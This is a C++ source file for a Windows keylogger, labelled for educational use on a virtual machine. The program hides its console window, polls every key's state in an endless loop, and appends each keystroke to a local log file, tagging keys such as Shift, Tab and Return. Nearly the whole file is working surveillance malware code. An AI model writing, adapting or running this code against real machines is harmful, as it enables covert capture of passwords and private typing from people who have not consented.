/*****************************************************************//**
 * \file   keylogger.cpp
 * \brief  Keylogger program to grab keystrokes from virtual machine.  
    FOR EDUCATIONAL USE ONLY.

 * \date   August 2020
 *********************************************************************/

#include <iostream>
#include <stdio.h>
#include <Windows.h>
#include <fstream>


using namespace std;

int KeyLogger(int _key, const char* file);

void WriteToLogFile(LPCSTR text)
{
	ofstream logfile;
	logfile.open("keylogs.txt", fstream::app);
	logfile << text;
	logfile.close();
}

int main()
{
	FreeConsole();
	
	while (true) {
		//ASCII range
		char i;
		Sleep(10);
		for (i = 8; i <= 255; i++)
		{
			/**
			*
			* 1) the key is currently being held down
			* 2) the key has just transitioned from released->pressed
			* 3) all other bits in GetAsyncKeyState are zero (which may or may not always be true)/
			
			//if( GetAsyncKeyState(i) & 0x0001 )
			*/
			//if (GetAsyncKeyState(i) == -32767)
			if (GetAsyncKeyState(i) & 0x0001)
				KeyLogger(i, "log.txt");
		}
	}

	return 0;
}

int KeyLogger(int _key, const char *file) {
	cout << _key << endl;
	Sleep(10);
	FILE* OUTPUT_FILE;
	OUTPUT_FILE = fopen(file, "a+"); //append the file forever
	// https://docs.microsoft.com/en-us/windows/win32/inputdev/virtual-key-codes
	if (_key == VK_SHIFT)
		fprintf(OUTPUT_FILE, "%s", "[SHIFT]");
	else if (_key == VK_BACK)
		fprintf(OUTPUT_FILE, "%s", "[BACK]");
	else if (_key == VK_LBUTTON)
		fprintf(OUTPUT_FILE, "%s", "[LBUTTON]");
	else if (_key == VK_SPACE)
		fprintf(OUTPUT_FILE, "%s", "[SPACE]");
	else if (_key == VK_RBUTTON)
		fprintf(OUTPUT_FILE, "%s", "[RBUTTON]");
	else if (_key == VK_TAB)
		fprintf(OUTPUT_FILE, "%s", "[TAB]");
	else if (_key == VK_RETURN)
		fprintf(OUTPUT_FILE, "%s", "[RETURN]");
	else if (_key == VK_UP)
		fprintf(OUTPUT_FILE, "%s", "[UP BUtton]");
	else if (_key == VK_RIGHT)
		fprintf(OUTPUT_FILE, "%s", "[RIGHT ARROW KEY]");
	else
		fprintf(OUTPUT_FILE, "%s", &_key);


	fclose(OUTPUT_FILE);
	return 0;

}
